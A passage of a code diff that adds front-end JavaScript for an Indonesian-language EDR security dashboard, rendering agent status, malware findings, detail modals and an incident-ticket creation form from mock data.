+            const rb = (edrSeverityCfg[b.severity]?.rank || 0);
+            return rb - ra;
+        });
+    }
+
+    function edrInit() {
+        edrBuildFindings();
+        edrRenderAll();
+        const el = document.getElementById('edr-last-refresh');
+        if (el) { el.textContent = 'Diperbarui: ' + new Date().toLocaleTimeString('id-ID'); el.classList.remove('hidden'); }
+    }
+
+    function edrRenderAll() {
+        edrBuildFindings();
+        edrRenderSummary();
+        edrRenderAgents();
+        edrRenderFindings();
+        edrRenderSidebar();
+        // Update finding badge on tab
+        const noInc = edrAllFindings.filter(f => !f.inc_no && !f.resolved).length;
+        const badge = document.getElementById('edr-finding-badge');
+        if (badge) { badge.textContent = noInc; badge.classList.toggle('hidden', noInc === 0); }
+    }
+
+    function edrRefresh() {
+        const icon = document.getElementById('edr-refresh-icon');
+        if (icon) { icon.classList.add('fa-spin'); setTimeout(() => icon.classList.remove('fa-spin'), 700); }
+        edrInit();
+    }
+
+    function edrTabSwitch(tab) {
+        edrCurrentTab = tab;
+        ['agents','findings'].forEach(t => {
+            const btn = document.getElementById('edr-tab-' + t);
+            const cnt = document.getElementById('edr-tab-' + t + '-content');
+            if (!btn || !cnt) return;
+            if (t === tab) { btn.classList.add('active'); cnt.style.display = ''; }
+            else           { btn.classList.remove('active'); cnt.style.display = 'none'; }
+        });
+    }
+
+    // ── Summary ──
+    function edrRenderSummary() {
+        const all       = mockData.edr || [];
+        const licensed  = all.filter(a => a.edr_status === 'licensed').length;
+        const unlicensed= all.filter(a => a.edr_status === 'unlicensed').length;
+        const none      = all.filter(a => a.edr_status === 'none').length;
+        const withAgent = licensed + unlicensed;
+        const agentPct  = all.length ? Math.round(withAgent / all.length * 100) : 0;
+        const activeThreats = edrAllFindings.filter(f => !f.resolved).length;
+        const noIncFindings = edrAllFindings.filter(f => !f.inc_no && !f.resolved).length;
+        const quarantined   = edrAllFindings.filter(f => f.aksi === 'Quarantined').length;
+        const criticalCount = edrAllFindings.filter(f => f.severity === 'Critical' && !f.resolved).length;
+        const licUsed = 912, licTotal = 1000;
+        const licPct  = Math.round(licUsed / licTotal * 100);
+
+        const cards = [
+            { icon:'fa-shield-alt', iconBg:'bg-rose-50', iconTx:'text-rose-500',
+              label:'Agen Terpasang', val:`${withAgent}/${all.length}`,
+              sub:`${licensed} licensed · ${unlicensed} unlicensed · ${none} tanpa agen`,
+              bar:agentPct, barCls:'bg-rose-500', valTx:'text-rose-600' },
+            { icon:'fa-bug', iconBg: activeThreats ? 'bg-rose-50' : 'bg-slate-50', iconTx: activeThreats ? 'text-rose-500' : 'text-slate-400',
+              label:'Temuan Aktif', val:activeThreats,
+              sub:`${criticalCount} Critical · ${noIncFindings} belum dibuat INC`,
+              bar: Math.min(activeThreats * 15, 100), barCls:'bg-rose-500', valTx: activeThreats ? 'text-rose-600' : 'text-slate-400' },
+            { icon:'fa-box', iconBg:'bg-violet-50', iconTx:'text-violet-500',
+              label:'Dikarantina', val:quarantined,
+              sub:`File berbahaya diisolasi oleh EDR`,
+              bar: Math.min(quarantined * 20, 100), barCls:'bg-violet-500', valTx:'text-violet-600' },
+            { icon:'fa-key', iconBg: licPct >= 90 ? 'bg-rose-50' : 'bg-amber-50', iconTx: licPct >= 90 ? 'text-rose-500' : 'text-amber-500',
+              label:'Lisensi EDR', val:`${licUsed}/${licTotal}`,
+              sub:`${licPct}% terpakai · ${licTotal - licUsed} tersisa`,
+              bar:licPct, barCls: licPct >= 90 ? 'bg-rose-500' : 'bg-amber-400', valTx: licPct >= 90 ? 'text-rose-600' : 'text-amber-600' },
+        ];
+        document.getElementById('edr-summary').innerHTML = cards.map(c => `
+            <div class="rounded-2xl border border-slate-100 bg-white p-4 shadow-sm">
+                <div class="flex items-center gap-2.5 mb-3">
+                    <div class="w-8 h-8 ${c.iconBg} rounded-xl flex items-center justify-center shrink-0">
+                        <i class="fas ${c.icon} ${c.iconTx} text-xs"></i>
+                    </div>
+                    <div class="flex-1"><p class="text-xs font-extrabold text-slate-800">${c.label}</p></div>
+                    <span class="text-xl font-extrabold ${c.valTx}">${c.val}</span>
+                </div>
+                <div class="h-1.5 bg-slate-100 rounded-full overflow-hidden mb-2">
+                    <div class="h-full ${c.barCls} rounded-full" style="width:${c.bar}%"></div>
+                </div>
+                <p class="text-[8px] text-slate-400">${c.sub}</p>
+            </div>`).join('');
+    }
+
+    // ── Agent list ──
+    function edrSetFilter(f) {
+        edrCurrentFilter = f;
+        ['all','licensed','unlicensed','none','threats'].forEach(k => {
+            const b = document.getElementById('edrf-' + k);
+            if (b) { if (k === f) b.classList.add('active'); else b.classList.remove('active'); }
+        });
+        edrRenderAgents();
+    }
+
+    function edrGetFilteredAgents() {
+        const q = (document.getElementById('edr-agent-search')?.value || '').toLowerCase();
+        const f = edrCurrentFilter;
+        return (mockData.edr || []).filter(a => {
+            if (f === 'licensed'   && a.edr_status !== 'licensed')   return false;
+            if (f === 'unlicensed' && a.edr_status !== 'unlicensed') return false;
+            if (f === 'none'       && a.edr_status !== 'none')       return false;
+            if (f === 'threats'    && !a.threats)                    return false;
+            if (q && ![a.vm, a.skpd, a.os].join(' ').toLowerCase().includes(q)) return false;
+            return true;
+        });
+    }
+
+    function edrRenderAgents() {
+        const rows  = edrGetFilteredAgents();
+        const badge = document.getElementById('edr-agent-count');
+        if (badge) badge.textContent = rows.length + ' agen';
+        const tbody = document.getElementById('edr-agent-tbody');
+        if (!tbody) return;
+        if (!rows.length) {
+            tbody.innerHTML = `<tr><td colspan="8" class="px-4 py-12 text-center">
+                <i class="fas fa-search text-3xl text-slate-200 block mb-3"></i>
+                <p class="text-xs font-bold text-slate-400">Tidak ada agen sesuai filter</p></td></tr>`;
+            return;
+        }
+        tbody.innerHTML = rows.map(a => {
+            const sc  = edrStatusCfg[a.edr_status] || edrStatusCfg.none;
+            const hasThreats = a.threats > 0;
+            const activeFindings = (a.malicious_log || []).filter(f => !f.resolved);
+            const rowBg = hasThreats ? 'bg-rose-50/20' : '';
+            const verOld = a.version && a.version !== '-' && a.version < '7.5.0';
+            return `<tr class="edr-row border-b border-slate-50 last:border-0 ${rowBg}" onclick="edrOpenAgentDetail(${a.id})">
+                <td class="px-4 py-3">
+                    <div class="flex flex-col items-center gap-0.5">
+                        <div class="w-2.5 h-2.5 rounded-full ${sc.dot} ${hasThreats ? 'nms-blink' : ''}"></div>
+                        <span class="text-[7px] font-extrabold ${sc.tx}">${sc.label}</span>
+                    </div>
+                </td>
+                <td class="px-4 py-3">
+                    <p class="text-[10px] font-bold text-slate-800 leading-tight">${a.vm}</p>
+                    <p class="text-[8px] text-slate-400">${a.skpd}</p>
+                </td>
+                <td class="px-4 py-3"><p class="text-[9px] font-bold text-slate-600">${a.os}</p></td>
+                <td class="px-4 py-3">
+                    <p class="text-[9px] font-bold ${verOld ? 'text-amber-600' : 'text-slate-600'}">${a.version || '—'}</p>
+                    ${verOld ? '<p class="text-[7px] text-amber-500">Perlu update</p>' : ''}
+                </td>
+                <td class="px-4 py-3">
+                    <span class="text-[8px] font-bold text-slate-600 bg-slate-100 px-2 py-0.5 rounded-lg">${a.policy || '—'}</span>
+                </td>
+                <td class="px-4 py-3"><p class="text-[9px] font-bold text-slate-600">${a.last_scan !== '-' ? a.last_scan : '—'}</p></td>
+                <td class="px-4 py-3 text-center">
+                    ${hasThreats
+                        ? `<span class="inline-flex flex-col items-center gap-0.5">
+                             <span class="text-xs font-extrabold text-rose-600">${activeFindings.length}</span>
+                             <span class="text-[7px] text-rose-400">aktif</span>
+                           </span>`
+                        : `<span class="text-[9px] text-slate-300">—</span>`}
+                </td>
+                <td class="px-4 py-3">
+                    <div class="flex items-center gap-1 justify-end">
+                        <button onclick="event.stopPropagation();edrOpenAgentDetail(${a.id})" title="Detail"
+                            class="w-7 h-7 flex items-center justify-center text-slate-400 bg-slate-50 hover:bg-rose-50 hover:text-rose-600 border border-slate-200 hover:border-rose-200 rounded-lg transition-colors text-[9px]">
+                            <i class="fas fa-eye"></i></button>
+                        <button onclick="event.stopPropagation();edrRemoveAgent(${a.id})" title="Lepas Agen"
+                            class="w-7 h-7 flex items-center justify-center text-slate-400 bg-slate-50 hover:bg-rose-50 hover:text-rose-600 border border-slate-200 hover:border-rose-200 rounded-lg transition-colors text-[9px]">
+                            <i class="fas fa-unlink"></i></button>
+                    </div>
+                </td>
+            </tr>`;
+        }).join('');
+    }
+
+    // ── Sidebar ──
+    function edrRenderSidebar() {
+        // Active threats
+        const threats = edrAllFindings.filter(f => !f.resolved);
+        const badge   = document.getElementById('edr-threat-badge');
+        const tlist   = document.getElementById('edr-threat-list');
+        if (badge) { badge.textContent = threats.length; badge.classList.toggle('hidden', threats.length === 0); }
+        if (tlist) {
+            if (!threats.length) {
+                tlist.innerHTML = `<div class="flex flex-col items-center py-8">
+                    <i class="fas fa-check-circle text-2xl text-emerald-400 mb-2"></i>
+                    <p class="text-[9px] font-bold text-slate-400">Tidak ada ancaman aktif</p></div>`;
+            } else {
+                tlist.innerHTML = threats.map(f => {
+                    const sc  = edrSeverityCfg[f.severity] || edrSeverityCfg.Low;
+                    const ac  = edrActionCfg[f.aksi] || {};
+                    return `<div class="rounded-xl border ${sc.border} ${sc.bg.replace('100','50/40')} p-2.5 cursor-pointer hover:opacity-90"
+                                onclick="edrOpenFindingDetail('${f.id}')">
+                        <div class="flex items-start gap-2">
+                            <i class="fas ${sc.icon} ${sc.tx} text-[9px] mt-0.5 shrink-0"></i>
+                            <div class="flex-1 min-w-0">
+                                <div class="flex items-center justify-between gap-1 mb-0.5">
+                                    <span class="text-[8px] font-extrabold ${sc.tx}">${f.severity}</span>
+                                    <span class="text-[7px] font-bold ${ac.tx || 'text-slate-500'} ${ac.bg || ''} px-1.5 py-0.5 rounded shrink-0">${f.aksi}</span>
+                                </div>
+                                <p class="text-[8px] font-bold text-slate-700 truncate">${f.tipe}</p>
+                                <p class="text-[7px] text-slate-500 truncate">${f._vm}</p>
+                                ${!f.inc_no ? `<span class="text-[7px] font-extrabold text-rose-500 bg-rose-50 border border-rose-200 px-1.5 py-0.5 rounded mt-1 inline-block">Belum INC</span>` : `<span class="text-[7px] font-extrabold text-slate-500 bg-slate-100 px-1.5 py-0.5 rounded mt-1 inline-block">${f.inc_no}</span>`}
+                            </div>
+                        </div>
+                    </div>`;
+                }).join('');
+            }
+        }
+        // Policy distribution
+        const plist = document.getElementById('edr-policy-list');
+        if (plist) {
+            const agents  = (mockData.edr || []).filter(a => a.edr_status !== 'none');
+            const policies = {};
+            agents.forEach(a => { const p = a.policy || '—'; policies[p] = (policies[p] || 0) + 1; });
+            const total = agents.length || 1;
+            const colors = ['bg-rose-400','bg-violet-400','bg-blue-400','bg-emerald-400','bg-amber-400','bg-slate-400'];
+            plist.innerHTML = Object.entries(policies).map(([p, cnt], i) => `
+                <div class="flex items-center gap-2">
+                    <div class="w-1.5 h-1.5 rounded-full ${colors[i % colors.length]} shrink-0"></div>
+                    <span class="text-[8px] text-slate-600 flex-1 truncate">${p}</span>
+                    <span class="text-[8px] font-extrabold text-slate-700">${cnt}</span>
+                    <div class="w-12 h-1 bg-slate-100 rounded-full overflow-hidden">
+                        <div class="h-full ${colors[i % colors.length]} rounded-full" style="width:${Math.round(cnt/total*100)}%"></div>
+                    </div>
+                </div>`).join('');
+        }
+    }
+
+    // ── Findings tab ──
+    function edrSetFindingFilter(f) {
+        edrFindingFilter = f;
+        ['all','critical','high','medium','no_inc','open'].forEach(k => {
+            const b = document.getElementById('edrf2-' + k);
+            if (b) { if (k === f) b.classList.add('active'); else b.classList.remove('active'); }
+        });
+        edrRenderFindings();
+    }
+
+    function edrGetFilteredFindings() {
+        const q = (document.getElementById('edr-finding-search')?.value || '').toLowerCase();
+        const f = edrFindingFilter;
+        return edrAllFindings.filter(finding => {
+            if (f === 'critical' && finding.severity !== 'Critical') return false;
+            if (f === 'high'     && finding.severity !== 'High')     return false;
+            if (f === 'medium'   && finding.severity !== 'Medium')   return false;
+            if (f === 'no_inc'   && finding.inc_no)                  return false;
+            if (f === 'open'     && finding.resolved)                return false;
+            if (q && ![finding.tipe, finding._vm, finding._skpd, finding.objek].join(' ').toLowerCase().includes(q)) return false;
+            return true;
+        });
+    }
+
+    function edrRenderFindings() {
+        const rows  = edrGetFilteredFindings();
+        const badge = document.getElementById('edr-finding-count');
+        if (badge) badge.textContent = rows.length + ' temuan';
+        const tbody = document.getElementById('edr-finding-tbody');
+        if (!tbody) return;
+        if (!rows.length) {
+            tbody.innerHTML = `<tr><td colspan="7" class="px-4 py-12 text-center">
+                <i class="fas fa-shield-alt text-3xl text-slate-200 block mb-3"></i>
+                <p class="text-xs font-bold text-slate-400">Tidak ada temuan sesuai filter</p></td></tr>`;
+            return;
+        }
+        tbody.innerHTML = rows.map(f => {
+            const sc  = edrSeverityCfg[f.severity] || edrSeverityCfg.Low;
+            const ac  = edrActionCfg[f.aksi] || {};
+            const rowBg = f.severity === 'Critical' && !f.resolved ? 'bg-rose-50/20' : f.severity === 'High' && !f.resolved ? 'bg-orange-50/20' : '';
+            const incCell = f.inc_no
+                ? `<span class="text-[8px] font-extrabold text-slate-600 bg-slate-100 border border-slate-200 px-2 py-0.5 rounded-lg">${f.inc_no}</span>`
+                : `<button onclick="event.stopPropagation();edrOpenFindingDetail('${f.id}')" class="text-[8px] font-extrabold text-rose-600 bg-rose-50 border border-rose-200 hover:bg-rose-100 px-2 py-0.5 rounded-lg transition-colors whitespace-nowrap">+ Buat INC</button>`;
+            return `<tr class="edr-finding-row border-b border-slate-50 last:border-0 ${rowBg}" onclick="edrOpenFindingDetail('${f.id}')">
+                <td class="px-4 py-3">
+                    <span class="inline-flex items-center gap-1 text-[8px] font-extrabold ${sc.tx} ${sc.bg} border ${sc.border} px-2 py-0.5 rounded-lg">
+                        <i class="fas ${sc.icon} text-[7px]"></i>${f.severity}
+                    </span>
+                </td>
+                <td class="px-4 py-3"><p class="text-[9px] font-bold text-slate-800">${f.tipe}</p></td>
+                <td class="px-4 py-3"><p class="text-[8px] font-mono text-slate-500 truncate max-w-[200px]" title="${f.objek}">${f.objek}</p></td>
+                <td class="px-4 py-3">
+                    <p class="text-[9px] font-bold text-slate-800">${f._vm}</p>
+                    <p class="text-[7px] text-slate-400">${f._skpd}</p>
+                </td>
+                <td class="px-4 py-3">
+                    <span class="text-[8px] font-bold ${ac.tx || 'text-slate-600'} ${ac.bg || 'bg-slate-100'} px-2 py-0.5 rounded-lg">
+                        <i class="fas ${ac.icon || 'fa-circle'} mr-0.5 text-[7px]"></i>${f.aksi}
+                    </span>
+                </td>
+                <td class="px-4 py-3">${incCell}</td>
+                <td class="px-4 py-3"><p class="text-[8px] text-slate-500">${f.tgl}</p></td>
+            </tr>`;
+        }).join('');
+    }
+
+    // ── Agent detail modal ──
+    function edrOpenAgentDetail(id) {
+        const a = (mockData.edr || []).find(x => x.id === id);
+        if (!a) return;
+        const sc = edrStatusCfg[a.edr_status] || edrStatusCfg.none;
+        const findings = (a.malicious_log || []);
+        const findingRows = findings.map(f => {
+            const sev = edrSeverityCfg[f.severity] || edrSeverityCfg.Low;
+            const ac  = edrActionCfg[f.aksi] || {};
+            return `<div class="border rounded-xl p-3 ${sev.border} ${f.resolved ? 'opacity-60' : ''} cursor-pointer hover:bg-slate-50"
+                        onclick="edrCloseModal();setTimeout(()=>edrOpenFindingDetail('${f.id}'),50)">
+                <div class="flex items-center justify-between mb-1.5">
+                    <div class="flex items-center gap-2">
+                        <span class="text-[8px] font-extrabold ${sev.tx} ${sev.bg} border ${sev.border} px-2 py-0.5 rounded-lg">${f.severity}</span>
+                        <span class="text-[9px] font-bold text-slate-800">${f.tipe}</span>
+                    </div>
+                    <div class="flex items-center gap-1.5">
+                        ${f.inc_no ? `<span class="text-[7px] font-extrabold text-slate-500 bg-slate-100 px-1.5 py-0.5 rounded">${f.inc_no}</span>` : `<span class="text-[7px] font-extrabold text-rose-500 bg-rose-50 border border-rose-200 px-1.5 py-0.5 rounded">Belum INC</span>`}
+                        <span class="text-[7px] font-bold ${ac.tx || ''} ${ac.bg || 'bg-slate-100'} px-1.5 py-0.5 rounded">${f.aksi}</span>
+                    </div>
+                </div>
+                <p class="text-[8px] font-mono text-slate-500 truncate">${f.objek}</p>
+                <p class="text-[7px] text-slate-400 mt-0.5">${f.tgl}</p>
+            </div>`;
+        }).join('') || `<p class="text-[9px] text-slate-400 text-center py-4">Tidak ada temuan tercatat</p>`;
+
+        edrShowModal(`
+            <div class="p-5 border-b border-slate-100 bg-gradient-to-r from-slate-50 to-white flex items-start gap-3">
+                <div class="w-10 h-10 bg-rose-50 rounded-2xl flex items-center justify-center shrink-0">
+                    <i class="fas fa-server text-rose-500"></i>
+                </div>
+                <div class="flex-1 min-w-0">
+                    <h3 class="font-extrabold text-slate-800 text-sm leading-tight">${a.vm}</h3>
+                    <p class="text-[9px] text-slate-500 mt-0.5">${a.skpd}</p>
+                    <span class="inline-flex items-center gap-1 mt-1 text-[8px] font-extrabold ${sc.tx} ${sc.bg} border ${sc.border} px-2 py-0.5 rounded-full">
+                        <span class="w-1.5 h-1.5 rounded-full ${sc.dot} inline-block"></span>${sc.label}
+                    </span>
+                </div>
+                <button onclick="edrCloseModal()" class="text-slate-400 hover:text-slate-600 text-lg shrink-0"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="p-5 grid grid-cols-2 gap-4 border-b border-slate-100">
+                <div class="bg-slate-50 rounded-xl p-3 space-y-2">
+                    <p class="text-[8px] font-extrabold text-slate-400 uppercase tracking-widest mb-2">Informasi Agen</p>
+                    <div class="flex justify-between"><span class="text-[9px] text-slate-500">OS</span><span class="text-[9px] font-bold text-slate-800">${a.os}</span></div>
+                    <div class="flex justify-between"><span class="text-[9px] text-slate-500">Versi</span><span class="text-[9px] font-bold ${a.version < '7.5.0' && a.version !== '-' ? 'text-amber-600' : 'text-slate-800'}">${a.version || '—'}</span></div>
+                    <div class="flex justify-between"><span class="text-[9px] text-slate-500">Policy</span><span class="text-[9px] font-bold text-slate-800">${a.policy || '—'}</span></div>
+                </div>
+                <div class="bg-slate-50 rounded-xl p-3 space-y-2">
+                    <p class="text-[8px] font-extrabold text-slate-400 uppercase tracking-widest mb-2">Aktivitas</p>
+                    <div class="flex justify-between"><span class="text-[9px] text-slate-500">Last Sync</span><span class="text-[9px] font-bold text-slate-800">${a.last_sync !== '-' ? a.last_sync : '—'}</span></div>
+                    <div class="flex justify-between"><span class="text-[9px] text-slate-500">Last Scan</span><span class="text-[9px] font-bold text-slate-800">${a.last_scan !== '-' ? a.last_scan : '—'}</span></div>
+                    <div class="flex justify-between"><span class="text-[9px] text-slate-500">Karantina</span><span class="text-[9px] font-bold ${a.quarantined ? 'text-violet-600' : 'text-slate-800'}">${a.quarantined} file</span></div>
+                </div>
+            </div>
+            <div class="p-5">
+                <p class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest mb-3">Temuan (${findings.length})</p>
+                <div class="space-y-2">${findingRows}</div>
+            </div>
+            <div class="px-5 pb-5 flex gap-2 justify-end border-t border-slate-100 pt-4">
+                <button onclick="edrCloseModal()" class="text-[9px] font-extrabold text-slate-500 bg-slate-100 hover:bg-slate-200 px-4 py-2 rounded-xl transition-colors">Tutup</button>
+            </div>`);
+    }
+
+    // ── Finding detail modal (with INC creation) ──
+    function edrOpenFindingDetail(findingId) {
+        const f = edrAllFindings.find(x => x.id === findingId);
+        if (!f) return;
+        const sc = edrSeverityCfg[f.severity] || edrSeverityCfg.Low;
+        const ac = edrActionCfg[f.aksi] || {};
+        const iocHtml = (f.ioc || []).map(i =>
+            `<span class="text-[8px] font-mono font-bold text-slate-600 bg-slate-100 border border-slate-200 px-2 py-0.5 rounded-lg">${i}</span>`
+        ).join(' ');
+        const rekHtml = (f.rekomendasi || '').split('\n').map(r => `<li class="text-[9px] text-slate-600">${r}</li>`).join('');
+
+        const incSection = f.inc_no
+            ? `<div class="mt-4 p-3 bg-slate-50 border border-slate-200 rounded-xl flex items-center gap-3">
+                <i class="fas fa-ticket-alt text-slate-400"></i>
+                <div class="flex-1">
+                    <p class="text-[9px] font-extrabold text-slate-700">Insiden terdaftar</p>
+                    <p class="text-[8px] text-slate-500">${f.inc_ket || 'Catatan insiden tersedia'}</p>
+                </div>
+                <span class="text-[9px] font-extrabold text-slate-700 bg-white border border-slate-200 px-2.5 py-1 rounded-xl">${f.inc_no}</span>
+               </div>`
+            : `<div class="mt-4 p-4 bg-rose-50 border-2 border-rose-200 border-dashed rounded-xl">
+                <div class="flex items-start gap-3">
+                    <i class="fas fa-exclamation-circle text-rose-500 text-lg mt-0.5 shrink-0"></i>
+                    <div class="flex-1">
+                        <p class="text-[10px] font-extrabold text-rose-700 mb-0.5">Temuan ini belum memiliki tiket insiden</p>
+                        <p class="text-[8px] text-rose-600">Buat insiden INC untuk mendokumentasikan, menugaskan, dan memantau penanganan temuan ini.</p>
+                    </div>
+                </div>
+                <div class="mt-3 flex justify-end">
+                    <button onclick="edrShowCreateINC('${findingId}')"
+                        class="flex items-center gap-2 text-[9px] font-extrabold text-white bg-rose-600 hover:bg-rose-700 px-4 py-2 rounded-xl transition-colors shadow-sm shadow-rose-200">
+                        <i class="fas fa-ticket-alt text-[8px]"></i>Buat Insiden INC
+                    </button>
+                </div>
+               </div>`;
+
+        edrShowModal(`
+            <div class="p-5 border-b border-slate-100 flex items-start gap-3 ${f.severity === 'Critical' ? 'bg-rose-50/50' : 'bg-slate-50/50'}">
+                <div class="w-10 h-10 ${sc.bg} border ${sc.border} rounded-2xl flex items-center justify-center shrink-0">
+                    <i class="fas ${sc.icon} ${sc.tx}"></i>
+                </div>
+                <div class="flex-1 min-w-0">
+                    <div class="flex items-center gap-2 mb-1">
+                        <span class="text-[8px] font-extrabold ${sc.tx} ${sc.bg} border ${sc.border} px-2 py-0.5 rounded-full">${f.severity}</span>
+                        <span class="text-[8px] font-bold ${ac.tx || ''} ${ac.bg || 'bg-slate-100'} px-2 py-0.5 rounded-full"><i class="fas ${ac.icon || ''} mr-0.5 text-[7px]"></i>${f.aksi}</span>
+                        ${f.resolved ? '<span class="text-[8px] font-extrabold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">Resolved</span>' : ''}
+                    </div>
+                    <h3 class="font-extrabold text-slate-800 text-sm">${f.tipe}</h3>
+                    <p class="text-[9px] font-mono text-slate-500 mt-0.5 truncate">${f.objek}</p>
+                </div>
+                <button onclick="edrCloseModal()" class="text-slate-400 hover:text-slate-600 text-lg shrink-0 mt-0.5"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="p-5 space-y-4 overflow-y-auto">
+                <!-- Info grid -->
+                <div class="grid grid-cols-2 gap-3">
+                    <div class="bg-slate-50 rounded-xl p-3 space-y-1.5">
+                        <p class="text-[8px] font-extrabold text-slate-400 uppercase tracking-widest mb-2">Detail Temuan</p>
+                        <div class="flex justify-between"><span class="text-[8px] text-slate-500">VM</span><span class="text-[8px] font-bold text-slate-800">${f._vm}</span></div>
+                        <div class="flex justify-between"><span class="text-[8px] text-slate-500">SKPD</span><span class="text-[8px] font-bold text-slate-800">${f._skpd}</span></div>
+                        <div class="flex justify-between"><span class="text-[8px] text-slate-500">Waktu</span><span class="text-[8px] font-bold text-slate-800">${f.tgl}</span></div>
+                    </div>
+                    <div class="bg-slate-50 rounded-xl p-3 space-y-1.5">
+                        <p class="text-[8px] font-extrabold text-slate-400 uppercase tracking-widest mb-2">Hash File</p>
+                        <p class="text-[8px] font-mono text-slate-600 break-all">${f.hash || '—'}</p>
+                    </div>
+                </div>
+                <!-- IOC -->
+                ${f.ioc && f.ioc.length ? `
+                <div>
+                    <p class="text-[8px] font-extrabold text-slate-500 uppercase tracking-widest mb-2">Indicator of Compromise (IOC)</p>
+                    <div class="flex flex-wrap gap-1.5">${iocHtml}</div>
+                </div>` : ''}
+                <!-- Deskripsi -->
+                ${f.deskripsi ? `
+                <div class="bg-amber-50/60 border border-amber-100 rounded-xl p-3">
+                    <p class="text-[8px] font-extrabold text-amber-700 uppercase tracking-widest mb-1.5"><i class="fas fa-info-circle mr-1"></i>Analisis Ancaman</p>
+                    <p class="text-[9px] text-slate-700 leading-relaxed">${f.deskripsi}</p>
+                </div>` : ''}
+                <!-- Rekomendasi -->
+                ${f.rekomendasi ? `
+                <div class="bg-blue-50/60 border border-blue-100 rounded-xl p-3">
+                    <p class="text-[8px] font-extrabold text-blue-700 uppercase tracking-widest mb-1.5"><i class="fas fa-tasks mr-1"></i>Rekomendasi Tindak Lanjut</p>
+                    <ul class="space-y-1 list-none">${rekHtml}</ul>
+                </div>` : ''}
+                <!-- INC Section -->
+                <div>
+                    <p class="text-[8px] font-extrabold text-slate-500 uppercase tracking-widest mb-1">Tiket Insiden</p>
+                    ${incSection}
+                </div>
+            </div>`);
+    }
+
+    // ── Create INC modal ──
+    function edrShowCreateINC(findingId) {
+        const f = edrAllFindings.find(x => x.id === findingId);
+        if (!f) return;
+        const sc = edrSeverityCfg[f.severity] || edrSeverityCfg.Low;
+        const defaultTitle = `[${f.severity}] ${f.tipe} terdeteksi pada ${f._vm}`;
+        const defaultPriority = f.severity === 'Critical' ? 'P1 - Critical' : f.severity === 'High' ? 'P2 - High' : 'P3 - Medium';
+        const pengelolaOptions = (mockData.pengelola || []).slice(0,8).map(p =>
+            `<option value="${p.id}">${p.nama} — ${p.jabatan} (${p.organisasi})</option>`).join('');
+
+        edrShowModal(`
+            <div class="p-5 border-b border-slate-100 flex items-center justify-between">
+                <div class="flex items-center gap-3">
+                    <div class="w-9 h-9 bg-rose-50 rounded-xl flex items-center justify-center">
+                        <i class="fas fa-ticket-alt text-rose-600"></i>
+                    </div>
+                    <div>
+                        <h3 class="text-sm font-extrabold text-slate-800">Buat Insiden INC</h3>
+                        <p class="text-[9px] text-slate-400">Temuan: <span class="font-bold ${sc.tx}">${f.tipe}</span> · ${f._vm}</p>
+                    </div>
+                </div>
+                <button onclick="edrOpenFindingDetail('${findingId}')" class="text-slate-400 hover:text-slate-600 text-lg"><i class="fas fa-arrow-left text-sm"></i></button>
+            </div>
+            <div class="p-5 space-y-4">
+                <div>
+                    <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">Judul Insiden <span class="text-rose-400">*</span></label>
+                    <input id="edr-inc-title" type="text" value="${defaultTitle}"
+                        class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-rose-300">
+                </div>
+                <div class="grid grid-cols-2 gap-3">
+                    <div>
+                        <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">Prioritas <span class="text-rose-400">*</span></label>
+                        <select id="edr-inc-priority" class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-rose-300 bg-white">
+                            <option ${defaultPriority==='P1 - Critical'?'selected':''}>P1 - Critical</option>
+                            <option ${defaultPriority==='P2 - High'?'selected':''}>P2 - High</option>
+                            <option ${defaultPriority==='P3 - Medium'?'selected':''}>P3 - Medium</option>
+                            <option>P4 - Low</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">Kategori</label>
+                        <select class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-rose-300 bg-white">
+                            <option selected>Security Incident</option>
+                            <option>Malware / Ransomware</option>
+                            <option>Intrusion Attempt</option>
+                            <option>Data Breach</option>
+                        </select>
+                    </div>
+                </div>
+                <div>
+                    <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">Ditugaskan ke</label>
+                    <select id="edr-inc-assignee" class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-rose-300 bg-white">
+                        <option value="">— Pilih pengelola —</option>
+                        ${pengelolaOptions}
+                    </select>
+                </div>
+                <div>
+                    <label class="text-[9px] font-extrabold text-slate-500 uppercase tracking-widest block mb-1.5">Deskripsi / Catatan Awal</label>
+                    <textarea id="edr-inc-desc" rows="4" placeholder="Deskripsikan temuan, langkah awal yang sudah diambil, dan konteks tambahan…"
+                        class="w-full px-3 py-2 text-[10px] border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-rose-300 resize-none">${f.deskripsi || ''}</textarea>
+                </div>
+                <!-- Context box -->
+                <div class="bg-rose-50/50 border border-rose-100 rounded-xl p-3">
+                    <p class="text-[8px] font-extrabold text-rose-600 mb-1.5">Konteks Otomatis dari EDR</p>
+                    <div class="grid grid-cols-2 gap-x-4 gap-y-1">
+                        <div class="flex justify-between"><span class="text-[7px] text-slate-500">Tipe</span><span class="text-[7px] font-bold text-slate-700">${f.tipe}</span></div>
+                        <div class="flex justify-between"><span class="text-[7px] text-slate-500">Aksi EDR</span><span class="text-[7px] font-bold text-slate-700">${f.aksi}</span></div>
+                        <div class="flex justify-between"><span class="text-[7px] text-slate-500">VM</span><span class="text-[7px] font-bold text-slate-700">${f._vm}</span></div>
+                        <div class="flex justify-between"><span class="text-[7px] text-slate-500">Waktu</span><span class="text-[7px] font-bold text-slate-700">${f.tgl}</span></div>
+                    </div>
+                    ${f.hash ? `<p class="text-[7px] font-mono text-slate-400 mt-1.5 truncate">Hash: ${f.hash}</p>` : ''}
+                </div>
+            </div>
+            <div class="px-5 pb-5 flex gap-2 justify-end border-t border-slate-100 pt-4">
+                <button onclick="edrOpenFindingDetail('${findingId}')" class="text-[9px] font-extrabold text-slate-500 bg-slate-100 hover:bg-slate-200 px-4 py-2 rounded-xl transition-colors">Batal</button>
